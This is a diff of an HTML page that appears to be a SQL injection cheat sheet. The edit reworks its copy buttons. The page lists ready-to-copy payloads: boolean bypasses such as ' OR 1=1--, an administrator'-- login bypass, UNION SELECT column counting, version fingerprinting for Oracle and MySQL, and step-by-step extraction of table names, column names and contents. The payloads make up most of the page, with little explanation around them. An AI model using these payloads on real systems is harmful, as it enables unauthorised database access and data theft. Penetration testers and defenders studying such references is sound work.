@@ -56,18 +56,20 @@
 If the vulnerability is present the goal is to "cut" the query and retrieve all, for that boolean 
 conditions are used.
 	
-<p id="HDT01" style="text-align:left"><mark>' OR 1=1--</mark></p>
-<p id="HDT02"><mark>' and 'a'='a--</mark></p>
-<p id="HDT03"><mark>' and 1=2;--</mark></p>
+<b>command C1:</b><p id="HDT01"><mark>' OR 1=1--</mark></p>
+<b>command C2:</b><p id="HDT02"><mark>' and 'a'='a--</mark></p>
+<b>command C3:</b><p id="HDT03"><mark>' and 1=2;--</mark></p>
 
-<button class="button_conf button_set" onclick="ctrl_C('#HDT01')">ctrl+C</button> | <button class="button_conf button_set" onclick="ctrl_C('#HDT02')">ctrl+C</button> | <button class="button_conf button_set" onclick="ctrl_C('#HDT03')">ctrl+C</button></p>
+<button class="button_conf button_set" onclick="ctrl_C('#HDT01')">copy C1!</button> | <button class="button_conf button_set" onclick="ctrl_C('#HDT02')">copy C2!</button> | <button class="button_conf button_set" onclick="ctrl_C('#HDT03')">copy C3!</button></p>
 </details>
 <details>
 <summary>LOGIN BYPASS TECHNIQUES</summary>
 <p><b>DESCRIPTION:</b> It is used to bypass login forms, guessing users or after collecting some of them.
 
-Sample:</p><div class='parent'>
-<div class='child inline-block-child'><p id="LBT01"><mark>administrator'--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#LBT01')">ctrl+C</button></div></div>
+Sample:
+<b>command C1:</b><p id="LBT01"><mark>administrator'--</mark></p> 
+
+<button class="button_conf button_set" onclick="ctrl_C('#LBT01')">copy C1!</button></p>
 </details>
 <details>
 <summary>DATABASE TYPE/VERSION/NUMBER TECHNIQUES</summary>
@@ -77,36 +79,41 @@ Sample:</p><div class='parent'>
 
 <b>PRE-REQS:</b>
 1. get column number
-<div class='parent'>
-  <b>method1:</b><div class='child inline-block-child'><p id="DTT01"><mark>' ORDER BY 1--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#DTT01')">ctrl+C</button></div>
-  <b>method2:</b><div class='child inline-block-child'><p id="DTT02"><mark>' UNION SELECT NULL--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#DTT02')">ctrl+C</button></div>
-</div>
+
+<b>method C1:</b><p id="DTT01"><mark>' ORDER BY 1--</mark></p> 
+<b>method C2:</b><p id="DTT02"><mark>' UNION SELECT NULL--</mark></p>
+
+<button class="button_conf button_set" onclick="ctrl_C('#DTT01')">copy MC1!</button> |  <button class="button_conf button_set" onclick="ctrl_C('#DTT02')">copy MC2!</button>
 	
 2. get field type
-<div class='parent'>
-<div class='child inline-block-child'><p id="DTT03"><mark>' UNION SELECT 'a',NULL,NULL,NULL--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#DTT03')">ctrl+C</button></div>
-<div class='child inline-block-child'><p id="DTT04"><mark>' UNION SELECT NULL,'a',NULL,NULL--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#DTT04')">ctrl+C</button></div>
-<div class='child inline-block-child'><p id="DTT05"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#DTT05')">ctrl+C</button></div>
-</div>
+	
+<b>command C1:</b><p id="DTT03"><mark>' UNION SELECT 'a',NULL,NULL,NULL--</mark></p>
+<b>command C2:</b><p id="DTT04"><mark>' UNION SELECT NULL,'a',NULL,NULL--</mark></p>
+<b>command C3:</b><p id="DTT05"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p>
 
+<button class="button_conf button_set" onclick="ctrl_C('#DTT03')">copy C1!</button> | <button class="button_conf button_set" onclick="ctrl_C('#DTT04')">copy C2!</button> | <button class="button_conf button_set" onclick="ctrl_C('#DTT05')">copy C3!</button>
+	
 <b>NOTE:</b> It is needed to be iterative so you can find the right field type. For that number of columns
 is needed. Also, for ORACLE the select statement is needed a table to search from, it can be any table.
 	
 <b>COMMON TESTS:</b>
 
 <b>ORACLE:</b>
-<div class='parent'>
-<div class='child inline-block-child'><p id="DTT06" style="text-align:left"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#DTT06')">ctrl+C</button></div>
-<div class='child inline-block-child'><p id="DTT07"><mark>' UNION SELECT banner,NULL FROM v$version--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#DTT07')">ctrl+C</button></div>
+
+<b>command C1:</b><p id="DTT06"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p> 
+<b>command C2:</b><p id="DTT07"><mark>' UNION SELECT banner,NULL FROM v$version--</mark></p> 
 *assuming it has two columns and both are type string.
-</div>
+
+<button class="button_conf button_set" onclick="ctrl_C('#DTT06')">copy C1!</button> | <button class="button_conf button_set" onclick="ctrl_C('#DTT07')">copy C2!</button>
 	
 <b>MYSQL | SQL:</b> 
-<div class='parent'>
-<div class='child inline-block-child'><p id="DTT08"><mark>' UNION SELECT @@version,NULL#</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#DTT08')">ctrl+C</button></div>
+
+<b>command C1:</b><p id="DTT08"><mark>' UNION SELECT @@version,NULL#</mark></p> 
+
+<button class="button_conf button_set" onclick="ctrl_C('#DTT08')">copy C1!</button>
+
 *assuming it has two columns and first is type string.
-</div>
-	
+
 <b>POSTGRESQL:</b></p>
 </details>
 <details>
@@ -119,17 +126,18 @@ is needed. Also, for ORACLE the select statement is needed a table to search fro
 2. get field type
 
 *after that information is collected, it is time to retrieve the TABLE_NAME of the database schema.
-<div class='parent'>
-<div class='child inline-block-child'><p id="LDCT01"><mark>' UNION SELECT table_name,NULL from information_schema.tables--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#LDCT01')">ctrl+C</button></div>
 
+<b>command C1:</b><p id="LDCT01"><mark>' UNION SELECT table_name,NULL from information_schema.tables--</mark></p> 
+	
 *once table is identified, it is time to retrieve the COLUMNS of the table
 
-<div class='child inline-block-child'><p id="LDCT02"><mark>' UNION SELECT column_name,NULL from information_schema.columns WHERE table_name='TABLE_NAME'--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#LDCT02')">ctrl+C</button></div>
-
+<b>command C2:</b><p id="LDCT02"><mark>' UNION SELECT column_name,NULL from information_schema.columns WHERE table_name='TABLE_NAME'--</mark></p> 
+	
 *once table_name and columns are identified, it is time to retrieve the CONTENT
 
-<div class='child inline-block-child'><p id="LDCT03"><mark>' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#LDCT03')">ctrl+C</button></div>
-</div>
+<b>command C3:</b><p id="LDCT03"><mark>' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark></p> 
+
+<button class="button_conf button_set" onclick="ctrl_C('#LDCT01')">copy C1!</button> | <button class="button_conf button_set" onclick="ctrl_C('#LDCT02')">copy C2!</button> | <button class="button_conf button_set" onclick="ctrl_C('#LDCT03')">copy C3!</button>
 </details>
 <details>
 <summary>ORACLE</summary>
@@ -139,15 +147,17 @@ is needed. Also, for ORACLE the select statement is needed a table to search fro
 
 *after that information is collected, it is time to retrieve the TABLE_NAME of the database schema.
 
-<mark>' UNION SELECT table_name,NULL from ALL_TABLES--</mark>
+<b>command C1:</b><p id="LDCT04"><mark>' UNION SELECT table_name,NULL from ALL_TABLES--</mark></p>
 
 *once table is identified, it is time to retrieve the COLUMNS of the table
 
-<mark>' UNION SELECT column_name,NULL from all_tab_columns WHERE table_name='TABLE_NAME'--</mark>
+<b>command C2:</b><p id="LDCT05"><mark>' UNION SELECT column_name,NULL from all_tab_columns WHERE table_name='TABLE_NAME'--</mark></p>
 
 *once table_name and columns are identified, it is time to retrieve the CONTENT
 
-<mark>' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark>	
+<b>command C3:</b><p id="LDCT06"><mark>' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark>
+
+<button class="button_conf button_set" onclick="ctrl_C('#LDCT04')">copy C1!</button> | <button class="button_conf button_set" onclick="ctrl_C('#LDCT05')">copy C2!</button> | <button class="button_conf button_set" onclick="ctrl_C('#LDCT06')">copy C3!</button></p>
 </details>
 
 <b>NOTE:</b> both ways needs to know the column number, field type and both examples are assuming it has
